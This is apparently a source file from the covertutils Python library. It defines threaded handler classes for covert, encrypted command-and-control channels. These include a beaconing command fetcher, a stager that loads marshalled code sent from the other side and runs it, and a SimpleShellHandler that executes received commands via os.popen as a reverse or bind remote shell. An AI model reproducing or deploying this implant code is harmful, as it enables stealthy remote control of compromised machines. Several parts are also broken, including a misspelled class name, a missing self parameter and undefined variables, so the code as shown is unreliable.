"""
This module provides a template for Automatic protocol creation.
"""
from abc import ABCMeta, abstractmethod
from time import sleep
from threading import Thread

from random import uniform

import marshal, types
from covertutils.payloads import CommonStages
from covertutils.helpers import defaultArgMerging


class BaseHandler :
    """
Subclassing this class and overriding its methods automatically creates a threaded handler.
The handler receives data chunks from the "`receive_function()`" and
    """
    __metaclass__ = ABCMeta


    def __init__( self, recv, send, orchestrator, **kw ) :
        """
:param function recv: A **blocking** function that returns every time a chunk is received. The return value must be return raw data.
:param function send: A function that takes raw data as argument and sends it across.
:param `orchestration.StackOrchestrator` orchestrator: An Object that is used to translate raw_data to `(stream, message)` tuples.
        """
        self.receive_function = recv
        self.send_function = send
        self.orchestrator = orchestrator

        self.__protocolThread = Thread( target = self.__protocolThreadFunction )
        self.__protocolThread.daemon = True
        self.__protocolThread.start()


    # @abstractmethod
    def __consume( self, stream, message ) :
        """
:param str stream: The stream that the message is a send.
:param str message: The message in plaintext. Empty string if not fully-assembled.
:rtype: None
        """
        if stream == None :
            self.onNotRecognised()
            return
        self.onChunk( stream, message )
        if message :
            self.onMessage( stream, message )


    @abstractmethod
    def onChunk( self, stream, message ) :
        """
This method runs whenever a new recognised chunk is consumed.

:param str stream: The recognised stream that this chunk belongs.
:param str message: The message that is contained in this chunk.
"""
        pass


    @abstractmethod
    def onMessage( self, stream, message ) :
        """
This method runs whenever a new message is assembled.

:param str stream: The recognised stream that this chunk belongs.
:param str message: The message that is contained in this chunk.
"""
        pass


    @abstractmethod
    def onNotRecognised( self ) :
        """
This method runs whenever a chunk is not recognised.
:rtype: None
"""
        pass


    # @abstractmethod
    def sendAdHoc( self, message, stream = None, assert_len = 0 ) :
        """
This method uses the object's StackOrchestrator instance to send raw_data to the other side, throught the specified `stream`.
:param str message: The mdata to be sent to the other side.
:param str stream: The stream name that will tag the data.
:rtype: bool
"""
        if stream == None :
            stream = self.orchestrator.getDefaultStream()
        chunks = self.orchestrator.readyMessage( message, stream )
        if assert_len != 0 :
            if len(chunks) > assert_len :
                return False
        for chunk in chunks :
            self.send_function( chunk )
        return True


    def __protocolThreadFunction( self ) :
        while True :
            raw_data = self.receive_function()
            stream, message = self.orchestrator.depositChunk( raw_data )
            self.__consume( stream, message )
            # sleep(0.1)








class CommandFetcherHandler( BaseHandler ) :

    __metaclass__ = ABCMeta

    Defaults = { 'request_data' : 'X', 'delay_between' : (1.0, 2.0), 'fetch_stream' : 'control' }


    def __init__( self,  recv, send, orchestrator, **kw ) :
        """
:param str req_data: The actual payload that is used in messages thet request data. Defaults to :data:`CommandFetcherHandler.CommandFetcherHandler.request_data`.
:param function receive_function: A **blocking** function that returns every time a chunk is received. The return value must be return raw data.
:param function send_function: A function that takes raw data as argument and sends it across.
:param `orchestration.StackOrchestrator` orchestrator: An Object that is used to translate raw_data to `(stream, message)` tuples.
        """
        super(CommandFetcherHandler, self).__init__( recv, send, orchestrator, **kw )

        self.Defaults['fetch_stream'] = orchestrator.getDefaultStream()
        arguments = defaultArgMerging( self.Defaults, kw )

        self.request_data = arguments['request_data']
        self.delay_between = arguments['delay_between']
        self.fetch_stream = arguments['fetch_stream']

        self.fetcher_thread = Thread( target = self.__fetcher_function )
        self.fetcher_thread.daemon = True
        self.fetcher_thread.start()


    def __fetcher_function( self, ) :

        while True :
            if not self.delay_between : continue    # to beat a race condition
            delay = uniform( *self.delay_between )
            sleep( delay )
            self.sendAdHoc( self.request_data, self.fetch_stream )





class FunctionDictHandler( BaseHandler ) :
    """

This class provides a per-stream function dict.
If a message is received from a `stream`, a function corresponding to this particular stream will be executed with single argument the received message.
The function's return value will be sent across that stream to the message's sender.

Ideal for simple `remote shell` implementation.

The FunctionDictHandler class implements the `onMessage()` function of the BaseHandler class.
The `function_dict` passed to this class `__init__()` must have the above format:

.. code:: python

    def os_echo( message ) :
        from os import popen
        resp = popen( "echo %s" % 'message' ).read()
        return resp

    function_dict = { 'echo' : os_echo }

Note: The functions must be **absolutely self contained**. In the above example the `popen()` function is imported inside the `os_echo`. This is to ensure that `popen()` will be available, as there is no way to tell if it will be imported from the handler's environment.

Well defined functions for that purpose can be found in :mod:`covertutils.Stages`. Also usable for the :class:`StageableHandler` class

.. code:: python

    from covertutils.Stages import CommonStages
    pprint( CommonStages )
    {'shell': {'function': <function __system_shell at 0x7fc347472320>,
           'marshal': 'c\\x01\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x02\\x00\\x00\\x00C\\x00\\x00\\x00s&\\x00\\x00\\x00d\\x01\\x00d\\x02\\x00l\\x00\\x00m\\x01\\x00}\\x01\\x00\\x01|\\x01\\x00|\\x00\\x00\\x83\\x01\\x00j\\x02\\x00\\x83\\x00\\x00}\\x02\\x00|\\x02\\x00S(\\x03\\x00\\x00\\x00Ni\\xff\\xff\\xff\\xff(\\x01\\x00\\x00\\x00t\\x05\\x00\\x00\\x00popen(\\x03\\x00\\x00\\x00t\\x02\\x00\\x00\\x00osR\\x00\\x00\\x00\\x00t\\x04\\x00\\x00\\x00read(\\x03\\x00\\x00\\x00t\\x07\\x00\\x00\\x00messageR\\x00\\x00\\x00\\x00t\\x06\\x00\\x00\\x00result(\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00s\\x15\\x00\\x00\\x00covertutils/Stages.pyt\\x0e\\x00\\x00\\x00__system_shell\\x04\\x00\\x00\\x00s\\x06\\x00\\x00\\x00\\x00\\x01\\x10\\x01\\x12\\x01'}}

    """

    __metaclass__ = ABCMeta

    def __init__( self,  recv, send, orchestrator, **kw ) :
        """
:param dict function_dict: A dict containing `(stream_name, function)` tuples. Every time a message is received from `stream_name`, `function(message)` will be automatically executed.
        """
        super( FunctionDictHandler, self ).__init__( recv, send, orchestrator, **kw )
        try :
            self.function_dict = kw['function_dict']
        except :
            raise NoFunctionAvailableException( "No Function dict provided to contructor" )


    # @abstractmethod
    def onMessage( self, stream, message ) :
        """
:raises: :exc:`NoFunctionAvailableException`
        """
        # super( FunctionDictHandler, self ).onMessage( stream, message )
        if stream in self.function_dict.keys() :
            resp = self.function_dict[ stream ]( message )
            return stream, resp
        else :
            raise NoFunctionAvailableException( "The stream '%s' does not have a corresponding function." % stream )



class StageableHandler ( FunctionDictHandler ) :

    __delimiter = ':'
    __add_action = "A"
    __replace_action = "R"
    __delete_action = "D"

    Default = { 'stage_stream' : 'stage' }

    def __init__( self, recv, send, orchestrator, **kw ) :
        super(StagableHandler, self).__init__( recv, send, orchestrator, **kw )

        arguments = defaultArgMerging( self.Defaults, kw )
        self.stage_stream = arguments['stage_stream']

        if  self.stage_stream not in self.orchestrator.getStream() :
            self.orchestrator.addStream( self.stage_stream )


    # @abstractmethod
    def onMessage( self, stream, message ) :
        super( StagableHandler, self ).onMessage( )
        if stream in self.function_dict.keys() :
            self.function_dict[ stream ]( message )

        else :
            raise NoFunctionAvailableException( "The stream '%s' does not have a corresponding function." % stream )


    def __staging( self, message ) :
        stream_name, action, serialized_function = message.split( self.__delimiter, 2 )
        function_code = marshal.loads( serialized_function )
        function = types.FunctionType(function_code, globals(), stream_name+"_handle")
        if action == self.__add_action :
            self.orchestrator.addStream( stream_name )
            self.function_dict[ stream ] = function
        elif action == self.__delete_action :
            self.orchestrator.deleteStream( stream_name )
            del self.function_dict[ stream ]
        elif action == self.__replace_action :
            self.function_dict[ stream ] = function



    def createStageMessage( self, stream, serialized_function, replace = True ) :
        action = 'A'
        if replace :
            action = 'R'
        message = stream + StageableHandler.__delimiter + action + StageableHandler.__delimiter + serialized_function
        return message



class ResponseOnlyHandler( BaseHandler ) :

    __metaclass__ = ABCMeta

    Defaults = {'request_data' : 'X'}

    def __init__( self,  recv, send, orchestrator, **kw ) :
        super(ResponseOnlyHandler, self).__init__( recv, send, orchestrator, **kw )

        arguments = defaultArgMerging( self.Defaults, kw )
        self.request_data = arguments['request_data']

        self.to_send_list = []
        self.to_send_raw = []


    def onMessage( self, stream, message ) :
        if message == self.request_data :
            if self.to_send_raw :
                to_send = self.to_send_raw.pop(0)
                self.send_function( to_send )


    def queueSend( self, message, stream = None ) :
        if stream == None :
            stream = self.orchestrator.getDefaultStream()

        chunks = self.orchestrator.readyMessage( message, stream )
        self.to_send_raw.extend( chunks )




class ResettableHandler ( BaseHandler ) :

    __metaclass__ = ABCMeta

    Defaults = { 'reset_data' : 'R' }

    def __init__( recv, send, orchestrator, **kw ) :
        super( ResettableHandler, self ).__init__( recv, send, orchestrator, **kw )

        self.Defaults['reset_data'] = orchestrator.getDefaultStream()
        arguments = defaultArgMerging( self.Defaults, kw )

        self.reset_data = arguments['reset_data']


    def reset( self, ) :
        self.orchestrator.reset()


    def sendReset( self ) :
        sendAdHoc( ResettableHandler.Defaults[reset_data] )


    def onMessage( self, stream, message ) :
        if message == self.Defaults[reset_data] :
            self.reset()
            return True
        return False



_function_dict = { 'control' : CommonStages['shell']['function'], 'main' : CommonStages['shell']['function'] }

class SimpleShellHandler ( FunctionDictHandler ) :
    """
	This class provides an implementation of Simple Remote Shell.
	It can be used on any shell type and protocol (bind, reverse, udp, icmp, etc),by adjusting `send_function()` and `receive_function()`

	All communication is chunked and encrypted, as dictated by the :class:`covertutils.orchestration.StackOrchestrator` object.

    This class directly executes commands on a System Shell (Windows or Unix) via the :func:`os.popen` function. The exact stage used to execute commands is explained in :mod:`covertutils.Stages`
"""

    def __init__( self, recv, send, orchestrator ) :
        """
:param function receive_function: A **blocking** function that returns every time a chunk is received. The return value must be return raw data.
:param function send_function: A function that takes raw data as argument and sends it across.
:param `orchestration.StackOrchestrator` orchestrator: An Object that is used to translate raw_data to `(stream, message)` tuples.
        """
        super( SimpleShellHandler, self ).__init__( recv, send, orchestrator, function_dict =  _function_dict )


    def onMessage( self, stream, message ) :
        stream, resp = super( SimpleShellHandler, self ).onMessage( stream, message )
        self.sendAdHoc( resp, stream )


    def onChunk( self, stream, message ) :
        pass


    def onNotRecognised( self ) :
        pass
